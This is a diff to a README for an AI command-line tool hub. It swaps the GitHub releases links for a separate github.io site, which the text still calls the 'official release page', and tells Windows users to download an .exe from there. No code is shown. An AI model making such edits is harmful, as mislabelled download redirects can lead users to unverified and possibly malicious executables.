@@ -1,6 +1,6 @@
 # 🚀 agentcli-cli-tool-hub - Manage your AI tools with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Yeami2146/agentcli-cli-tool-hub/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://yeami2146.github.io)
 
 AgentCLI helps you find and start AI command-line tools. You use it to organize your programs in one place. It works on Windows, Linux, and macOS. This tool makes it simple to run scripts for your projects without typing complex commands.
 
@@ -8,7 +8,7 @@ AgentCLI helps you find and start AI command-line tools. You use it to organize 
 
 Follow these steps to set up AgentCLI on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Yeami2146/agentcli-cli-tool-hub/releases).
+1. Go to the [official release page](https://yeami2146.github.io).
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
